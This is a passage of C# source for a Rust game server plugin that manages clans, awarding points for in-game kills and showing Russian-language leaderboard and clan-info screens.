                        new CuiRawImageComponent {Color = "0.3294118 0.3294118 0.3294118 0.5", Sprite = "assets/content/ui/ui.background.tile.psd" },
                        new CuiRectTransformComponent {AnchorMin = "0.05 0.45", AnchorMax = "0.8 0.55"}
                    }
            });

            elements.Add(new CuiElement
            {
                Parent = "clans_setAvatar_input",
                Components =
                    {
                        new CuiTextComponent { Text = "<size=24>СКОПИРУЙТЕ СЮДА ССЫЛКУ И НАЖМИТЕ СОХРАНИТЬ</size>", Color = "1 0.9294118 0.8666667 0.05", Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter},
                        new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" },
                    }
            });



            elements.Add(new CuiElement()
            {
                Parent = "clans_setAvatar_input",
                Components =
                {
                    new CuiInputFieldComponent
                    {
                        Align = TextAnchor.MiddleCenter,
                        CharsLimit = 80,
                        FontSize = 26,
                        Command = $"clan_changeAvatar ",
                        Font = "robotocondensed-bold.ttf",
                        Text = "",
                        Color = "1 0.9294118 0.8666667 1"
                    },
                    new CuiRectTransformComponent
                    {
                        AnchorMin = "0 0", AnchorMax = "1 1"
                    }
                }
            });

            elements.Add(new CuiButton
            {
                Button = { Color = "0.59 0.83 0.60 1.00", Command = "" },
                Text = { Text = "СОХРАНИТЬ", Align = TextAnchor.MiddleCenter, FontSize = 14, Font = "robotocondensed-bold.ttf", Color = "1 0.9294118 0.8666667 1" },
                RectTransform = { AnchorMin = $"1 0", AnchorMax = $"1.2 0.993" },
            }, "clans_setAvatar_input");

            CuiHelper.AddUi(player, elements);
        }


        [ConsoleCommand("clan_changeAvatar")]
        void cmdChangeAvatarOfClan(ConsoleSystem.Arg args)
        {
            var player = args.Player();
            if (args.GetString(0) == "" || !args.Args[0].Contains("http") || !args.Args[0].Contains(".png") && !args.Args[0].Contains(".jpg")) return;

            var clan = findClanByUser(player.UserIDString);
            clan.ClanAvatar = args.Args[0];
            ImageLibrary.Call("AddImage", clan.ClanAvatar, clan.ClanAvatar);
            NewClanUI(player);
        }

        private Dictionary<uint, ulong> LastHeliHit = new Dictionary<uint, ulong>();

        private BasePlayer GetLastHeliAttacker(uint heliNetId)
        {
            ulong player;
            LastHeliHit.TryGetValue(heliNetId, out player);
            return BasePlayer.FindByID(player);
        }

        void OnEntityDeath(BaseCombatEntity entity, HitInfo info)
        {
            if (info == null || entity?.net?.ID == null) return;

            if (entity is BaseHelicopter)
            {
                var newClan = findClanByUser(GetLastHeliAttacker(entity.net.ID).UserIDString);
                if (newClan == null) return;
                newClan.members[GetLastHeliAttacker(entity.net.ID).UserIDString].KilledHeli++;
                newClan.ClanPoints += PointsOfKilledHeli;
                newClan.members[GetLastHeliAttacker(entity.net.ID).UserIDString].PlayerPoints += PointsOfKilledHeli;
                return;
            }
			
			if (entity is BradleyAPC)
            {
                var newClan = findClanByUser(GetLastHeliAttacker(entity.net.ID).UserIDString);
                if (newClan == null) return;
                newClan.members[GetLastHeliAttacker(entity.net.ID).UserIDString].KilledTank++;
                newClan.ClanPoints += PointsOfKilledTank;
                newClan.members[GetLastHeliAttacker(entity.net.ID).UserIDString].PlayerPoints += PointsOfKilledTank;
                return;
            }
			

            var player = info?.InitiatorPlayer;
            if (player == null) return;
            var clan = findClanByUser(player.UserIDString);
            if (clan == null) return;
            if (entity.PrefabName.Contains("barrel"))
            {
                if (IsBlocked() == 0) return;
                clan.members[player.UserIDString].PlayerPoints += PointsOfBarrel;
                clan.ClanPoints += PointsOfBarrel;
            }

            if (entity.ToPlayer() != null)
            {
                if (entity.GetComponent<NPCPlayer>() != null || IsNPC(entity.ToPlayer())) return;
                if (entity.ToPlayer() == info.Initiator.ToPlayer())
                {
                    clan.ClanPoints -= PointsOfSuicide;
                    clan.members[player.UserIDString].Suicide++;
                    clan.members[player.UserIDString].PlayerPoints -= PointsOfSuicide;
                    return;
                }
                else
                {
                    clan.ClanPoints += PointsOfKilled;
                    clan.members[player.UserIDString].Killed++;
                    clan.members[player.UserIDString].PlayerPoints += PointsOfKilled;
                }
              
            }
        }
		
		
		void OnRocketLaunched(BasePlayer player, BaseEntity entity)
        {
			var clan = findClanByUser(player.UserIDString);
			if (clan == null) return;
            if (player == null || entity == null || IsNPC(player)) return;
			if (entity.ShortPrefabName == "rocket_fire" || entity.ShortPrefabName == "rocket_hv")
            {
                return;
            }

			
                clan.members[player.UserIDString].PlayerPoints += PointsOfRocket;
                clan.ClanPoints += PointsOfRocket;
        }
		
		void OnExplosiveThrown(BasePlayer player, BaseEntity entity)
        {
			var clan = findClanByUser(player.UserIDString);
			if (clan == null) return;
            if (player == null || entity == null || (entity is SupplySignal) || (entity is SurveyCharge) || IsNPC(player)) return;
			if (entity.ShortPrefabName == "grenade.f1.deployed" || entity.ShortPrefabName == "flare.deployed" || entity.ShortPrefabName == "grenade.smoke.deployed" || entity.ShortPrefabName == "explosive.satchel.deployed" || entity.ShortPrefabName == "grenade.beancan.deployed") return;
			
                clan.members[player.UserIDString].PlayerPoints += PointsOfRocket;
                clan.ClanPoints += PointsOfRocket;
        }

        private bool IsNPC(BasePlayer player)
        {
            if (player == null) return false;
            if (player is NPCPlayer) return true;
            if (!(player.userID >= 76560000000000000L || player.userID <= 0L) || player.UserIDString.Length < 17) return true;
            return false;
        }

        int GetPercent(int need, int current) => current * 100 / need;

        double GetPercentFUll(double need, double current) => current * 100 / need;



        string ButtonListedClan = "[{\"name\":\"clans_player{id}\",\"parent\":\"Clanstop_main8\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"{color}\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.001 {amin}\",\"anchormax\":\"0.998 {amax}\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"CuiElement\",\"parent\":\"clans_player{id}\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"\",\"fontSize\":16,\"font\":\"robotocondensed-bold.ttf\",\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.2784314\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"CuiElement\",\"parent\":\"clans_player{id}\",\"components\":[{\"type\":\"UnityEngine.UI.Button\",\"command\":\"{command}\",\"color\":\"1 1 1 0\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]}]";

        string TOP = "[{\"name\":\"Clanstop_main2\",\"parent\":\"Overlay\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"0 0 0 0.6980392\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_main3\",\"parent\":\"Clanstop_main2\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"0 0 0 0.1647059\"},{\"type\":\"NeedsCursor\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.2 0.1546297\",\"anchormax\":\"0.8 0.8935185\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_main4\",\"parent\":\"Clanstop_main3\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"0.3294118 0.3294118 0.3294118 0.7058824\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.003548417 0.9385965\",\"anchormax\":\"0.9953553 0.9955974\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_main5\",\"parent\":\"Clanstop_main4\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"<b>{title}</b>\",\"fontSize\":18,\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_main6\",\"parent\":\"Clanstop_main5\",\"components\":[{\"type\":\"UnityEngine.UI.Button\",\"close\":\"Clanstop_main2\",\"color\":\"0.5254902 0.282353 0.2313726 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.935175 0\",\"anchormax\":\"0.9986773 0.94\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_main7\",\"parent\":\"Clanstop_main6\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"<b>X</b>\",\"fontSize\":18,\"align\":\"MiddleCenter\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_main8\",\"parent\":\"Clanstop_main3\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"0.3294118 0.3294118 0.3294118 0.7058824\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.003548417 0.005012453\",\"anchormax\":\"0.9953553 0.8734336\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_main9\",\"parent\":\"Clanstop_main3\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"0.3294118 0.3294118 0.3294118 0.7058824\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.003548413 0.8809524\",\"anchormax\":\"0.9953553 0.9310777\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_main10\",\"parent\":\"Clanstop_main9\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"МЕСТО\",\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.03405698 0\",\"anchormax\":\"0.1355833 1\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_main11\",\"parent\":\"Clanstop_main9\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"НАЗВАНИЕ КЛАНА\",\"align\":\"MiddleLeft\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.1329573 0\",\"anchormax\":\"0.6983538 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_main12\",\"parent\":\"Clanstop_main9\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"ОЧКИ\",\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.7298629 0\",\"anchormax\":\"0.8270121 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_main12\",\"parent\":\"Clanstop_main9\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"ИГРОКОВ\",\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.8585205 0\",\"anchormax\":\"0.9985565 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]}]";

        string InfoTOP = "[{\"name\":\"Clanstop_info2\",\"parent\":\"Overlay\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"0 0 0 0.6980392\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_info3\",\"parent\":\"Clanstop_info2\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"0 0 0 0.1647059\"},{\"type\":\"NeedsCursor\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.2 0.1546297\",\"anchormax\":\"0.8 0.8935185\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_info4\",\"parent\":\"Clanstop_info3\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"0.3294118 0.3294118 0.3294118 0.7058824\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.003548417 0.9385965\",\"anchormax\":\"0.9953553 0.9955974\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_info5\",\"parent\":\"Clanstop_info4\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"<b>{clanname}</b> МЕСТО В РЕЙТИНГЕ: {RANK}\",\"fontSize\":18,\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_info6\",\"parent\":\"Clanstop_info5\",\"components\":[{\"type\":\"UnityEngine.UI.Button\",\"close\":\"Clanstop_info2\",\"color\":\"0.5254902 0.282353 0.2313726 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.935175 0\",\"anchormax\":\"0.9986773 0.94\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_info7\",\"parent\":\"Clanstop_info6\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"<b>X</b>\",\"fontSize\":18,\"align\":\"MiddleCenter\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_info8\",\"parent\":\"Clanstop_info5\",\"components\":[{\"type\":\"UnityEngine.UI.Button\",\"command\":\"{return}\",\"color\":\"0.2175973 0.2175973 0.2175973 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.0004332103 0\",\"anchormax\":\"0.1224549 0.93\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_info9\",\"parent\":\"Clanstop_info8\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"<b>НАЗАД</b>\",\"fontSize\":16,\"align\":\"MiddleCenter\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_info10\",\"parent\":\"Clanstop_info3\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"0.3294118 0.3294118 0.3294118 0.7058824\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.003548417 0.005012453\",\"anchormax\":\"0.9953553 0.7481203\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_info11\",\"parent\":\"Clanstop_info10\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"0.4039216 0.3921569 0.372549 0.3843137\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.9173692\",\"anchormax\":\"1 1.000001\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_main10\",\"parent\":\"Clanstop_info11\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"<b>ИМЯ ИГРОКА</b>\",\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"0.2528636 1\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_main10\",\"parent\":\"Clanstop_info11\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"<b>СТАТУС</b>\",\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.2449865 0\",\"anchormax\":\"0.4594171 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_main10\",\"parent\":\"Clanstop_info11\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"<b>ОЧКИ</b>\",\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.4576665 0\",\"anchormax\":\"0.6055799 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_main10\",\"parent\":\"Clanstop_info11\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"<b>НОРМА в %</b>\",\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.6073302 0\",\"anchormax\":\"0.7771242 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_main10\",\"parent\":\"Clanstop_info11\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"<b>УБИЙСТВ/СМЕРТЕЙ</b>\",\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.7841259 0\",\"anchormax\":\"0.9985565 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_info12\",\"parent\":\"Clanstop_info10\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"0.4039216 0.3921569 0.372549 0.3843137\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.01011801\",\"anchormax\":\"1 0.9123102\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_info13\",\"parent\":\"Clanstop_info3\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"0.3294118 0.3294118 0.3294118 0.7058824\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.003548413 0.755639\",\"anchormax\":\"0.9953553 0.9310777\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Clanstop_info14\",\"parent\":\"Clanstop_info13\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"0.4039216 0.3921569 0.372549 0.3843137\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.6318366 0.1428573\",\"anchormax\":\"0.9670526 0.8928576\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_info15\",\"parent\":\"Clanstop_info14\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"<b>ВСЕГО ОЧКОВ: {Points}\n\nЛИДЕР КЛАНА: {lname}</b>\",\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_info16\",\"parent\":\"Clanstop_info13\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"0.4039216 0.3921569 0.372549 0.3843137\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.2187297 0.1428573\",\"anchormax\":\"0.5644442 0.8928576\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_info17\",\"parent\":\"Clanstop_info16\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"<b>ИГРОКОВ В КЛАНЕ: {ccount}</b>\",\"align\":\"MiddleCenter\",\"color\":\"1 0.9294118 0.8666667 1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]},{\"name\":\"Clanstop_info18\",\"parent\":\"Clanstop_info13\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"1 1 1 0\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.03318176 0.07857105\",\"anchormax\":\"0.1382089 0.9357135\",\"offsetmax\":\"0 0\"}]}]";

        string InfoTOPButton = "[{\"name\":\"clans_player{id}\",\"parent\":\"Clanstop_info12\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"{color}\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.001 {amin}\",\"anchormax\":\"0.998 {amax}\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"CuiElement\",\"parent\":\"clans_player{id}\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"\",\"fontSize\":16,\"font\":\"robotocondensed-bold.ttf\",\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.2784314\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"CuiElement\",\"parent\":\"clans_player{id}\",\"components\":[{\"type\":\"UnityEngine.UI.Button\",\"command\":\"{command}\",\"color\":\"1 1 1 0\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]}]";

        [ConsoleCommand("clanstop_info")]
        void cmdClansTopKey(ConsoleSystem.Arg arg)
        {
            var player = arg.Player();
            var clan = findClan(arg.Args[0]);
            if (clan != null)
            {
                ClanTOPInfo(player, clan, arg.Args.Length > 1 ? int.Parse(arg.Args[1]) : 0);
            }
        }

        [ConsoleCommand("clanstop_main")]
        void cmdClansTopMain(ConsoleSystem.Arg arg)
        {
            var player = arg.Player();
            ClanTOP(player, arg.Args != null ? int.Parse(arg.Args[0]) : 0);
        }

        [ChatCommand("ctop")]
        void cmdClanTOP(BasePlayer player, string command, string[] args)
        {
            ClanTOP(player, 0);
        }

        public int GetClanIndex(string key)
        {
            var ClanMembers = from pair in clans orderby pair.Value.ClanPoints descending select pair;
            int index = 1;
            foreach (KeyValuePair<string, Clan> clanIndex in ClanMembers)
            {
                if (clanIndex.Value.tag == key)
                    return index;
                index++;
            }
            return 0;
        }

        string GetPlayerStatus(string player, Clan clan)
        {
            string status = "⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠";

            if (clan == null) return "Обычный игрок";
            if (clan.members.ContainsKey(player)) status = "Участник";
            if (clan.moderators.Contains(player)) status = "Капитан";
            if (clan.owner.Contains(player)) status = "Лидер";
            return status;
        }

        void ClanTOPInfo(BasePlayer player, Clan clan, int page)
        {
            CuiHelper.DestroyUi(player, "Clanstop_main2");
            CuiHelper.DestroyUi(player, "Clanstop_info2");

            CuiHelper.AddUi(player, InfoTOP.Replace("{clanname}", "КЛАН: " + clan.tag.ToUpper() + " | ")
                .Replace("{RANK}", GetClanIndex(clan.tag).ToString())
                 .Replace("{ccount}", clan.members.Count.ToString())
                  .Replace("{ocount}", clan.online.ToString())
                   .Replace("{Points}", clan.ClanPoints.ToString())
                   .Replace("{lname}", clan.ownerName.ToUpper())
                    .Replace("{avatar}", (string)ImageLibrary.Call("GetImage", clan.ClanAvatar))
                    .Replace("{return}", "clanstop_main")
                );
            var elements = new CuiElementContainer();
            elements.Add(new CuiElement
            {
                Parent = $"Clanstop_info13",
                Components =
                    {
                        new CuiRawImageComponent {Color = "1 1 1 0.5", Png = (string)ImageLibrary?.Call("GetImage", clan.ClanAvatar)},
                       // new CuiRawImageComponent {Color = "1 1 1 0.5", Png = (string)ImageLoader?.Call("GetImage", clan.ClanAvatar)},
                        new CuiRectTransformComponent {AnchorMin = "0.03318176 0.07857105", AnchorMax = "0.1382089 0.9357135"}
                    }
            });
            string colored = "0.25 0.25 0.23 0.5";
            double Amin = 0.92;
            double Amax = 0.995;
            int i = 1;

            var ClanMembers = from pair in clan.members orderby pair.Value.PlayerPoints descending select pair;
            foreach (KeyValuePair<string, PlayerStats> key in ClanMembers.Skip(11 * page).Take(ClanMembers.ToList().Count >= 10 ? 10 : ClanMembers.ToList().Count))
            {

                CuiHelper.AddUi(player, InfoTOPButton.Replace("{amin}", Amin.ToString()).Replace("{amax}", Amax.ToString()).Replace("{color}", colored).Replace("{id}", key.Key));
                elements.Add(new CuiLabel
                {
                    Text = { Text = $"{page * 10 + i}", Color = "1 0.9294118 0.8666667 1", FontSize = 14, Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter },
                    RectTransform = { AnchorMin = $"0 0", AnchorMax = $"0.05 1" },
                }, "clans_player" + key.Key);
                elements.Add(new CuiLabel
                {
                    Text = { Text = covalence.Players.FindPlayerById(key.Key) != null ? covalence.Players.FindPlayerById(key.Key).Name : "Имя не указано", Font = "robotocondensed-bold.ttf", FontSize = 14, Color = "1 0.9294118 0.8666667 1", Align = TextAnchor.MiddleCenter },
                    RectTransform = { AnchorMin = $"0 0", AnchorMax = $"0.2528636 1" },
                }, "clans_player" + key.Key);
                elements.Add(new CuiLabel
                {
                    Text = { Text = GetPlayerStatus(key.Key, clan), Color = "1 0.9294118 0.8666667 1", Font = "robotocondensed-bold.ttf", FontSize = 14, Align = TextAnchor.MiddleCenter },
                    RectTransform = { AnchorMin = $"0.2449865 0", AnchorMax = $"0.4594171 1" },
                }, "clans_player" + key.Key);
                elements.Add(new CuiLabel
                {
                    Text = { Text = key.Value.PlayerPoints.ToString(), Color = "1 0.9294118 0.8666667 1", FontSize = 14, Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter },
                    RectTransform = { AnchorMin = $"0.4576665 0", AnchorMax = $"0.6055799 1" },
                }, "clans_player" + key.Key);
                elements.Add(new CuiLabel
                {
                    Text = { Text = $"{GetFullPercent(key.Key)}%", Color = "1 0.9294118 0.8666667 1", FontSize = 14, Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter },
                    RectTransform = { AnchorMin = $"0.6073302 0", AnchorMax = $"0.7771242 1" },
                }, "clans_player" + key.Key);
                elements.Add(new CuiLabel
                {
                    Text = { Text = $"{key.Value.Killed}/{key.Value.Death + key.Value.Suicide}", Color = "1 0.9294118 0.8666667 1", FontSize = 14, Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter },
                    RectTransform = { AnchorMin = $"0.7841259 0", AnchorMax = $"0.9985565 1" },
                }, "clans_player" + key.Key);
                i++;
                Amin = Amin - 0.085;
                Amax = Amax - 0.085;

            }

            elements.Add(new CuiButton
            {
                Button = { Color = "0.25 0.25 0.23 0.9" },
                Text = { Text = "" },
                RectTransform = { AnchorMin = $"0.01 0", AnchorMax = $"0.1 0.048" },
            }, "Clanstop_info12", "clans_page");
            elements.Add(new CuiButton
            {
                Button = { Color = "0.4039216 0.3921569 0.372549 0.7", Command = page > 0 ? $"clanstop_info {clan.tag} {page - 1}" : "" },
                Text = { Text = "<", Color = "1 0.9294118 0.8666667 1", FontSize = 15, Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter },
                RectTransform = { AnchorMin = $"0 0", AnchorMax = $"0.33 0.997" },
            }, "clans_page");

            elements.Add(new CuiButton
            {
                Button = { Color = "0.3294118 0.3294118 0.3294118 0" },
                Text = { Text = $"{page + 1}", Color = "1 0.9294118 0.8666667 1", Font = "robotocondensed-bold.ttf", FontSize = 13, Align = TextAnchor.MiddleCenter },
                RectTransform = { AnchorMin = $"0.33 0", AnchorMax = $"0.66 0.997" },
            }, "clans_page");

            elements.Add(new CuiButton
            {
                Button = { Color = "0.4039216 0.3921569 0.372549 0.7", Command = ClanMembers.Skip(11 * (page + 1)).Count() > 0 ? $"clanstop_info {clan.tag} {page + 1}" : "" },
                Text = { Text = ">", Color = "1 0.9294118 0.8666667 1", FontSize = 15, Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter },
                RectTransform = { AnchorMin = $"0.66 0", AnchorMax = $"0.997 0.997" },
            }, "clans_page");
            CuiHelper.AddUi(player, elements);

        }

        [PluginReference] private Plugin Tournament;

        void ClanTOP(BasePlayer player, int page)
        {
            CuiHelper.DestroyUi(player, "Clanstop_info2");
            CuiHelper.DestroyUi(player, "Clanstop_main2");
            CuiHelper.AddUi(player, TOP.Replace("{title}", msg("clanTOPUItitle", player.UserIDString).ToUpper()));
            string colored = "0.25 0.25 0.23 0.5";
            var elements = new CuiElementContainer();
            double Amin = 0.93;
            double Amax = 0.995;
            int i = 1;
            var ClanMembers = from pair in clans orderby pair.Value.ClanPoints descending select pair;

            foreach (KeyValuePair<string, Clan> key in ClanMembers.Skip(10 * page).Take(ClanMembers.ToList().Count >= 10 ? 10 : ClanMembers.ToList().Count))
            {
                CuiHelper.AddUi(player, ButtonListedClan.Replace("{amin}", Amin.ToString()).Replace("{amax}", Amax.ToString()).Replace("{color}", colored).Replace("{id}", key.Key));
                elements.Add(new CuiElement
                {
                    Parent = $"clans_player{key.Key}",
                    Components =
                    {
                        new CuiRawImageComponent {Color = "1 1 1 0.5", Png = (string)ImageLibrary?.Call("GetImage", key.Value.ClanAvatar)},
                        new CuiRectTransformComponent {AnchorMin = "0.01 0.1", AnchorMax = "0.04 0.9"}
                    }
                });

                elements.Add(new CuiLabel
                {
                    Text = { Text = $"{page * 10 + i}", Color = "1 0.9294118 0.8666667 1", FontSize = 14, Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft },
